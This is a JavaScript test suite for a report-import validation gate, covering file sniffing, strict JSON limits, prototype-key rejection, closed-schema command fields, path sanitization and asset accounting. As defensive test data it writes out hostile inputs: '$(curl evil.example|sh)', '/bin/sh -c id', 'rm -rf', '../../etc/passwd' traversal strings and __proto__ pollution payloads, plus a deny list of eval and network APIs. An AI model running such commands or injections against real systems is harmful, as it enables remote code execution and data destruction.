// T24 / TEST-24 — malicious report, text and asset boundary tests.
//
// Covers the import gate end to end: container/kind sniffing, strict JSON
// accounting (duplicate keys, depth, strings, nonfinite, unsafe numbers,
// surrogates), prototype-key rejection, closed-schema executable/plugin
// fields, safe names and corpus paths, decoded-asset accounting and the
// report-only accept surface. PNG decode abuse lives in png.test.mjs;
// script-free HTML evidence lives in html.test.mjs.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join, resolve } from 'node:path';
import {
  ContractError,
  normalize,
  seal,
  sha256,
  validateJson,
} from '../../../packages/contracts/src/index.ts';
import {
  IMPORT_LIMITS,
  MAX_BASE64_CHARS,
  importArtifact,
  importReport,
  importStringBounds,
  isSafeRelativePath,
  safeFileName,
  sniffImportKind,
} from '../../../packages/reports/validation/index.ts';
import { makePng, patternRgba, rowsFor, fakePdfBytes } from './png_helpers.mjs';

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '../../..');
const VALID_DIR = join(ROOT, 'planning/contracts/examples/valid');
const INVALID_INDEX = join(
  ROOT,
  'planning/contracts/examples/invalid-index.json',
);

const TE = new TextEncoder();
const code = (fn) => {
  try {
    fn();
  } catch (e) {
    if (e instanceof ContractError) return e.code;
    throw e;
  }
  return null;
};
const hex = (u8) => [...u8].map((b) => b.toString(16).padStart(2, '0')).join('');

const loadJson = (name) =>
  JSON.parse(readFileSync(join(VALID_DIR, name), 'utf8'));

/** Clone, mutate, reseal (hash-covered edits) and serialize. */
const reseal = (report, mutate) => {
  const r = structuredClone(report);
  mutate(r);
  seal(r);
  return JSON.stringify(r);
};

/** Build a contract-valid PNG asset object for `pngBytes`. */
const pngAsset = (id, pngBytes, pageIndex = 0) => {
  const dv = new DataView(pngBytes.buffer, pngBytes.byteOffset, pngBytes.byteLength);
  return {
    id,
    media_type: 'image/png',
    sha256: hex(sha256(pngBytes)),
    byte_length: pngBytes.length,
    purpose: 'crop',
    data_base64: Buffer.from(pngBytes).toString('base64'),
    pixel_size: [dv.getUint32(16), dv.getUint32(20)],
    page_index: pageIndex,
    geometry: null,
  };
};

const EVIDENCE = loadJson('native-evidence.inkflip.json');
const CORPUS = loadJson('corpus.json');

// ---------------------------------------------------------------------------
// Container / kind boundary — before any parsing or decompression
// ---------------------------------------------------------------------------

test('archive, container and markup inputs are rejected at the byte boundary', () => {
  const cases = [
    ['zip', Uint8Array.from([0x50, 0x4b, 0x03, 0x04, 1, 2, 3, 4]), 'ARCHIVE'],
    ['zip-eocd', Uint8Array.from([0x50, 0x4b, 0x05, 0x06, 0, 0, 0, 0]), 'ARCHIVE'],
    ['gzip', Uint8Array.from([0x1f, 0x8b, 0x08, 0, 0, 0]), 'ARCHIVE'],
    ['7z', Uint8Array.from([0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c, 0, 0]), 'ARCHIVE'],
    ['rar', Uint8Array.from([0x52, 0x61, 0x72, 0x21, 0x1a, 0x07]), 'ARCHIVE'],
    ['xz', Uint8Array.from([0xfd, 0x37, 0x7a, 0x58, 0x5a, 0x00]), 'ARCHIVE'],
    ['bzip2', Uint8Array.from([0x42, 0x5a, 0x68, 0x39]), 'ARCHIVE'],
    ['zstd', Uint8Array.from([0x28, 0xb5, 0x2f, 0xfd, 0x00]), 'ARCHIVE'],
    ['ole', Uint8Array.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), 'ARCHIVE'],
    ['cab', Uint8Array.from([0x4d, 0x53, 0x43, 0x46]), 'ARCHIVE'],
    ['pdf', Uint8Array.from([0x25, 0x50, 0x44, 0x46, 0x2d, 0x31, 0x2e]), 'KIND'],
    ['html', TE.encode('<!doctype html><html><body>x</body></html>'), 'KIND'],
    ['html-ws', TE.encode('  \n\t<html></html>'), 'KIND'],
    ['svg', TE.encode('<svg xmlns="http://www.w3.org/2000/svg"/>'), 'KIND'],
    ['xml', TE.encode('<?xml version="1.0"?><r/>'), 'KIND'],
    ['utf16le', Uint8Array.from([0xff, 0xfe, 0x7b, 0x00, 0x7d, 0x00]), 'UNICODE'],
    ['utf16be', Uint8Array.from([0xfe, 0xff, 0x00, 0x7b, 0x00, 0x7d]), 'UNICODE'],
    ['utf32', Uint8Array.from([0xff, 0xfe, 0x00, 0x00, 0x7b]), 'UNICODE'],
  ];
  for (const [name, bytes, want] of cases) {
    assert.equal(code(() => sniffImportKind(bytes)), want, name);
    assert.equal(code(() => importReport(bytes)), want, `gate:${name}`);
  }
  // tar magic sits at offset 257.
  const tar = new Uint8Array(600);
  tar.set([0x75, 0x73, 0x74, 0x61, 0x72], 257); // 'ustar'
  assert.equal(code(() => importReport(tar)), 'ARCHIVE', 'tar');
});

test('JSON polyglot attempts fail: leading junk, trailing data, concatenated docs', () => {
  const doc = JSON.stringify({ kind: 'report' });
  assert.equal(code(() => importReport(doc + '   {"a":1}')), 'JSON');
  assert.equal(code(() => importReport(doc + '\nPK\x03\x04')), 'JSON');
  assert.equal(code(() => importReport('x' + doc)), 'JSON');
  // A UTF-8 BOM is skipped by the strict parser, but the decoded stub is
  // still not a report — the import must fail, never be accepted.
  assert.notEqual(
    code(() => importReport(Uint8Array.from([0xef, 0xbb, 0xbf, ...TE.encode(doc)]))),
    null,
  );
});

// ---------------------------------------------------------------------------
// Strict JSON accounting — oversize, truncation, depth, strings, numbers
// ---------------------------------------------------------------------------

test('oversized JSON input is rejected before decode-sized allocation', () => {
  const big = new Uint8Array(IMPORT_LIMITS.maxJsonBytes + 1);
  big.fill(0x20);
  big[0] = 0x7b; // '{'
  assert.equal(code(() => importReport(big)), 'SIZE');
});

test('truncated reports are rejected as JSON, never partially accepted', () => {
  const raw = readFileSync(join(VALID_DIR, 'empty-completed.json'));
  // every cut that drops content bytes must fail; cutting only trailing
  // whitespace is a still-valid document, so stop below the last '}'.
  const lastBrace = raw.lastIndexOf(0x7d);
  for (const cut of [1, 7, 40, 199, lastBrace - 1, lastBrace]) {
    assert.ok(cut < raw.length);
    assert.equal(
      code(() => importReport(raw.subarray(0, cut))),
      'JSON',
      `cut=${cut}`,
    );
  }
});

test('duplicate keys are rejected at any depth', () => {
  const raw = readFileSync(join(VALID_DIR, 'empty-completed.json'), 'utf8');
  const dup = raw.replace(
    '"kind": "report"',
    '"kind": "report","kind": "report"',
  );
  assert.notEqual(dup, raw, 'fixture layout changed; update the splice');
  assert.equal(code(() => importReport(dup)), 'DUPLICATE_KEY');
  assert.equal(
    code(() => importReport('{"a":{"b":1,"b":2}}')),
    'DUPLICATE_KEY',
  );
});

test('nesting beyond 24 levels fails DEPTH, not stack overflow', () => {
  const deep25 = '['.repeat(25) + '1' + ']'.repeat(25);
  assert.equal(code(() => importReport(deep25)), 'DEPTH');
  const deep = '['.repeat(60000) + '1' + ']'.repeat(60000);
  assert.equal(code(() => importReport(deep)), 'DEPTH');
});

test('nonfinite and unsafe numbers are rejected', () => {
  assert.equal(code(() => importReport('{"a":1e999}')), 'NONFINITE');
  assert.equal(code(() => importReport('{"a":NaN}')), 'NONFINITE');
  assert.equal(code(() => importReport('{"a":Infinity}')), 'NONFINITE');
  assert.equal(code(() => importReport('{"a":9007199254740993}')), 'NUMBER');
  assert.equal(code(() => importReport('{"a":' + '9'.repeat(400) + '}')), 'NUMBER');
});

test('lone surrogates and raw control characters are rejected', () => {
  assert.equal(code(() => importReport('{"a":"\\ud800"}')), 'UNICODE');
  assert.equal(code(() => importReport('{"a":"\\udc00x"}')), 'UNICODE');
  const withCtrl = Uint8Array.from([0x7b, 0x22, 0x61, 0x22, 0x3a, 0x22, 0x01, 0x22, 0x7d]);
  assert.equal(code(() => importReport(withCtrl)), 'JSON');
});

test('non-payload strings over 2,000,000 chars fail before schema work', () => {
  const big = 'x'.repeat(IMPORT_LIMITS.maxStringChars + 1);
  const raw = reseal(EVIDENCE, (r) => {
    r.findings[0].title = big;
  });
  assert.equal(code(() => importReport(raw)), 'SIZE');
  // and the same bound applied directly, including its boundary
  assert.equal(code(() => importStringBounds({ a: big })), 'SIZE');
  const ok = 'y'.repeat(IMPORT_LIMITS.maxStringChars);
  assert.doesNotThrow(() => importStringBounds({ a: ok, b: [ok] }));
});

// ---------------------------------------------------------------------------
// Prototype-key handling
// ---------------------------------------------------------------------------

test('prototype-polluting keys fail with PROTOTYPE at any position', () => {
  // constructor/prototype are ordinary own keys: object injection works
  const injections = [
    (r) => {
      r.readers[0].settings.constructor = 'x';
    },
    (r) => {
      r.export.prototype = ['polluted'];
    },
    (r) => {
      r.document.constructor = { name: 'forged' };
    },
  ];
  for (const mutate of injections) {
    const r = reseal(EVIDENCE, mutate);
    assert.equal(code(() => importReport(r)), 'PROTOTYPE');
  }
  // __proto__ assignment mutates the prototype instead of adding a
  // member, so these cases are built the way an attacker sends them —
  // as literal JSON text.
  const raw = readFileSync(join(VALID_DIR, 'empty-completed.json'), 'utf8');
  const textual = [
    raw.replace(
      '"kind": "report"',
      '"__proto__":{"polluted":true},"kind": "report"',
    ),
    raw.replace(
      '"document": {',
      '"document": {"__proto__":{"sha256":"' + '0'.repeat(64) + '"},',
    ),
    raw.replace(
      '"readers": [\n    {',
      '"readers": [\n    {"__proto__":{"isAdmin":true},',
    ),
    '{"__proto__":{"a":1}}',
    '{"a":{"__proto__":[]}}',
    '{"a":{"constructor":1}}',
    '{"prototype":[]}',
  ];
  for (const doc of textual) {
    assert.notEqual(
      doc.indexOf('__proto__') < 0 &&
        doc.indexOf('constructor') < 0 &&
        doc.indexOf('prototype') < 0,
      true,
      'splice did not apply',
    );
    assert.equal(code(() => importReport(doc)), 'PROTOTYPE', doc.slice(0, 60));
  }
});

test('prototype keys do not pollute: a parsed __proto__ is inert data', () => {
  // loadsStrict already materializes __proto__ as an own property; the
  // audit rejects it. A benign field named like a normal word is fine.
  const res = importReport(readFileSync(join(VALID_DIR, 'empty-completed.json')));
  assert.equal(res.report.kind, 'report');
  assert.notEqual(Object.getPrototypeOf(res.report), null);
});

// ---------------------------------------------------------------------------
// Executable / plugin / command fields — closed schema, no reader selection
// ---------------------------------------------------------------------------

test('executable, plugin, command and path fields fail by closed schema', () => {
  const injections = [
    (r) => {
      r.execute = 'run --this';
    },
    (r) => {
      r.plugin = { url: 'https://evil.example/x.js' };
    },
    (r) => {
      r.command = '/bin/sh -c id';
    },
    (r) => {
      r.reader_path = '/tmp/evil';
    },
    (r) => {
      r.readers[0].executable = 'evil.exe';
    },
    (r) => {
      r.readers[0].path = '/usr/bin/evil';
    },
    (r) => {
      r.readers[0].settings.shell = 'zsh -c';
    },
    (r) => {
      r.execution.argv = ['rm', '-rf'];
    },
    (r) => {
      r.execution.command = 'pypdfium2 --unsafe';
    },
    (r) => {
      r.execution.loader = { model_url: 'https://x/m.tflite' };
    },
  ];
  for (let i = 0; i < injections.length; i++) {
    const raw = reseal(EVIDENCE, injections[i]);
    assert.equal(code(() => importReport(raw)), 'SCHEMA', `injection ${i}`);
  }
});

test('reader manifest cannot select executables: execution_policy is a const', () => {
  const manifest = loadJson('reader-manifest.json');
  const mutated = structuredClone(manifest);
  mutated.execution_policy = 'report_supplied_commands_allowed';
  assert.equal(code(() => importArtifact(JSON.stringify(mutated))), 'SCHEMA');
  assert.equal(code(() => importArtifact(JSON.stringify(manifest))), null);
});

test('a report cannot invoke a shell through any field: no string is a command', () => {
  // reader settings only allow the closed property set — even a perfect
  // shell string inside an open-looking place is just text or SCHEMA.
  const raw = reseal(EVIDENCE, (r) => {
    r.readers[0].name = '$(curl evil.example|sh)';
    r.execution.environment = 'PATH=/tmp;`id`';
  });
  const res = importReport(raw);
  assert.equal(res.report.readers[0].name, '$(curl evil.example|sh)'); // inert text
});

// ---------------------------------------------------------------------------
// Safe names and paths
// ---------------------------------------------------------------------------

test('corpus manifest source_path traversal is rejected with PATH', () => {
  // the contract PATH rule rejects '..', absolute, backslash and colon
  const bad = [
    '../x.pdf',
    'a/../b.pdf',
    '/abs/x.pdf',
    '\\win\\x.pdf',
    'C:\\x.pdf',
    'x:drive.pdf',
  ];
  for (const p of bad) {
    const r = structuredClone(CORPUS);
    r.entries[0].source_path = p;
    assert.equal(
      code(() => importArtifact(JSON.stringify(r))),
      'PATH',
      p,
    );
  }
  const good = structuredClone(CORPUS);
  assert.equal(code(() => importArtifact(JSON.stringify(good))), null);
});

test('display_name is sanitized into a safe basename, never a path', () => {
  const cases = [
    ['../../etc/passwd', 'etc_passwd'],
    ['..\\win\\sys32.dll', 'win_sys32.dll'],
    ['CON', '_CON'],
    ['con.pdf', '_con.pdf'],
    ['aux', '_aux'],
    ['...', 'report'],
    ['', 'report'],
    ['normal name.pdf', 'normal_name.pdf'],
    ['trailing.', 'trailing'],
    ['a/b/c/d.txt', 'a_b_c_d.txt'],
    ['-flag', 'flag'],
    ['file\u0000name', 'file_name'],
    ['lpt1', '_lpt1'],
  ];
  for (const [input, want] of cases) {
    assert.equal(safeFileName(input), want, JSON.stringify(input));
  }
  const long = safeFileName('a'.repeat(300));
  assert.ok(long.length <= 120);
  // a hostile display_name stays inert text on import…
  const raw = reseal(EVIDENCE, (r) => {
    r.document.display_name = '../../../etc/passwd\u0000.pdf';
    r.export.included.push('filename');
  });
  const res = importReport(raw);
  assert.equal(res.report.document.display_name, '../../../etc/passwd\u0000.pdf');
  // …and only becomes a filename through the sanitizer
  assert.equal(
    safeFileName(res.report.document.display_name),
    'etc_passwd_.pdf',
  );
});

test('isSafeRelativePath mirrors the corpus PATH rule', () => {
  for (const p of ['a/b/c.pdf', 'x.pdf', 'a-b_c/1.pdf']) {
    assert.ok(isSafeRelativePath(p), p);
  }
  for (const p of ['', '/a', 'a/../b', '../a', 'a\\b', 'C:x', 'a//b', './a', 'a/.']) {
    assert.ok(!isSafeRelativePath(p), p);
  }
});

// ---------------------------------------------------------------------------
// Decoded-asset accounting — count, encoded ceiling, decoded ceiling, hash
// ---------------------------------------------------------------------------

test('more than 128 assets fails before any asset is decoded', () => {
  const png = makePng({
    width: 4, height: 4, colorType: 6, bitDepth: 8,
    pixelRows: rowsFor(patternRgba(4, 4), 4, 4, 6, 8),
  });
  const raw = reseal(EVIDENCE, (r) => {
    for (let i = 0; i < 129; i++) {
      r.assets.push(pngAsset(`a_x${i}`, png));
    }
  });
  assert.equal(code(() => importReport(raw)), 'SIZE');
});

test('base64 longer than the 20 MiB decoded ceiling fails before decode', () => {
  const raw = reseal(EVIDENCE, (r) => {
    r.assets[0].data_base64 = 'A'.repeat(MAX_BASE64_CHARS + 4);
    // sha/byte_length now mismatch, but SIZE must win before decode/hash
  });
  assert.equal(code(() => importReport(raw)), 'SIZE');
});

test('an asset decoding past 20 MiB fails SIZE at accounting', () => {
  // A PNG carrying a huge ancillary tEXt chunk sized so the file is
  // exactly 20 MiB + 1: its base64 is within the encoded ceiling, so the
  // decoded-bytes check is the one that fires.
  const target = IMPORT_LIMITS.maxAssetBytes + 1;
  const base = makePng({
    width: 4, height: 4, colorType: 6, bitDepth: 8,
    pixelRows: rowsFor(patternRgba(4, 4), 4, 4, 6, 8),
  });
  const padLen = target - base.length - 12; // chunk header+crc
  const png = makePng({
    width: 4, height: 4, colorType: 6, bitDepth: 8,
    pixelRows: rowsFor(patternRgba(4, 4), 4, 4, 6, 8),
    preIdat: [{ type: 'tEXt', data: new Uint8Array(padLen).fill(0x41) }],
  });
  assert.equal(png.length, target);
  const raw = reseal(EVIDENCE, (r) => {
    r.assets.push(pngAsset('a_big', png));
  });
  assert.equal(code(() => importReport(raw)), 'SIZE');
});

test('decoded asset total over 20 MiB fails SIZE', () => {
  const padLen = 10_500_000;
  const mk = () =>
    makePng({
      width: 4, height: 4, colorType: 6, bitDepth: 8,
      pixelRows: rowsFor(patternRgba(4, 4), 4, 4, 6, 8),
      preIdat: [{ type: 'tEXt', data: new Uint8Array(padLen).fill(0x42) }],
    });
  const p1 = mk();
  const p2 = mk();
  assert.ok(p1.length + p2.length > IMPORT_LIMITS.maxAssetTotalBytes);
  const raw = reseal(EVIDENCE, (r) => {
    r.assets.push(pngAsset('a_t1', p1), pngAsset('a_t2', p2));
  });
  assert.equal(code(() => importReport(raw)), 'SIZE');
});

test('asset hash/length mismatches and invalid base64 fail ASSET', () => {
  // flip one base64 char: decoded bytes change, declared sha256 stays
  const raw = reseal(EVIDENCE, (r) => {
    const s = r.assets[0].data_base64;
    r.assets[0].data_base64 = (s[0] === 'A' ? 'B' : 'A') + s.slice(1);
  });
  assert.equal(code(() => importReport(raw)), 'ASSET');
  const raw2 = reseal(EVIDENCE, (r) => {
    r.assets[0].byte_length = r.assets[0].byte_length + 1;
  });
  assert.equal(code(() => importReport(raw2)), 'ASSET');
  const raw3 = reseal(EVIDENCE, (r) => {
    r.assets[0].data_base64 = '!!!invalid!!!';
    r.assets[0].sha256 = '0'.repeat(64);
  });
  assert.equal(code(() => importReport(raw3)), 'SCHEMA'); // pattern fails first
});

test('declared media_type must match both signature and purpose', () => {
  // SVG bytes labeled image/png
  const svg = TE.encode('<svg xmlns="http://www.w3.org/2000/svg"><script/></svg>');
  const raw = reseal(EVIDENCE, (r) => {
    r.assets.push({
      id: 'a_svg',
      media_type: 'image/png',
      sha256: hex(sha256(svg)),
      byte_length: svg.length,
      purpose: 'crop',
      data_base64: Buffer.from(svg).toString('base64'),
      pixel_size: [4, 4],
      page_index: 0,
      geometry: null,
    });
  });
  assert.equal(code(() => importReport(raw)), 'ASSET');
  // svg media_type is not in the closed enum at all
  const raw2 = reseal(EVIDENCE, (r) => {
    r.assets[0].media_type = 'image/svg+xml';
  });
  assert.equal(code(() => importReport(raw2)), 'SCHEMA');
  // a PDF labeled as a crop image
  const pdf = fakePdfBytes();
  const raw3 = reseal(EVIDENCE, (r) => {
    r.assets.push({
      id: 'a_pdf',
      media_type: 'image/png',
      sha256: hex(sha256(pdf)),
      byte_length: pdf.length,
      purpose: 'crop',
      data_base64: Buffer.from(pdf).toString('base64'),
      pixel_size: [4, 4],
      page_index: 0,
      geometry: null,
    });
  });
  assert.equal(code(() => importReport(raw3)), 'ASSET');
});

// ---------------------------------------------------------------------------
// Accept surface — the gate is not over-strict
// ---------------------------------------------------------------------------

test('every delivered valid report example imports cleanly', () => {
  const files = readdirSync(VALID_DIR).filter((f) => f.endsWith('.json'));
  const reports = files.filter(
    (f) => JSON.parse(readFileSync(join(VALID_DIR, f), 'utf8')).kind === 'report',
  );
  assert.ok(reports.length >= 5, `expected >=5 report examples, got ${reports.length}`);
  for (const f of reports) {
    const res = importReport(readFileSync(join(VALID_DIR, f)));
    assert.equal(res.report.kind, 'report', f);
    // every PNG asset comes back with a sanitized re-encode
    for (const a of res.report.assets) {
      if (a.media_type === 'image/png') {
        const clean = res.assets.sanitizedPngs.get(a.id);
        assert.ok(clean, `${f}:${a.id} sanitized`);
        assert.equal(clean.width, a.pixel_size[0]);
        assert.equal(clean.height, a.pixel_size[1]);
      }
    }
  }
});

test('delivered invalid examples are still rejected through the gate', () => {
  const index = JSON.parse(readFileSync(INVALID_INDEX, 'utf8'));
  for (const entry of index) {
    const raw = readFileSync(join(ROOT, 'planning', entry.path));
    const actual = code(() => importArtifact(raw));
    assert.notEqual(actual, null, `${entry.path} unexpectedly accepted`);
  }
});

test('non-report contract artifacts validate via importArtifact only', () => {
  assert.equal(code(() => importReport(JSON.stringify(CORPUS))), 'KIND');
  assert.equal(code(() => importArtifact(JSON.stringify(CORPUS))), null);
  const comparison = JSON.stringify(loadJson('comparison.json'));
  assert.equal(code(() => importArtifact(comparison)), null);
});

test('hash-excluded fields may differ; everything else must not', () => {
  // execution_id, started_at, duration_ms and asset bytes are excluded
  // from report_id by contract — mutating them keeps the report valid.
  const raw = reseal(EVIDENCE, (r) => {
    r.execution.execution_id = '123e4567-e89b-42d3-a456-426614174000';
    r.execution.started_at = '2026-01-01T00:00:00Z';
    r.execution.duration_ms = 999;
  });
  assert.equal(code(() => importReport(raw)), null);
});

test('validation never executes, fetches or touches the network', () => {
  // the module surface is pure functions over bytes — assert the source
  // carries no network/process/dynamic-eval surface at all
  const dir = join(ROOT, 'packages/reports/validation');
  for (const f of readdirSync(dir).filter((x) => x.endsWith('.ts'))) {
    const src = readFileSync(join(dir, f), 'utf8');
    for (const bad of [
      'fetch(', 'XMLHttpRequest', 'WebSocket', 'node:', 'eval(',
      'new Function', 'import(', 'process.', 'Date.now',
      'Math.random', 'setTimeout', 'setInterval',
    ]) {
      assert.ok(!src.includes(bad), `${f} contains ${bad}`);
    }
  }
});
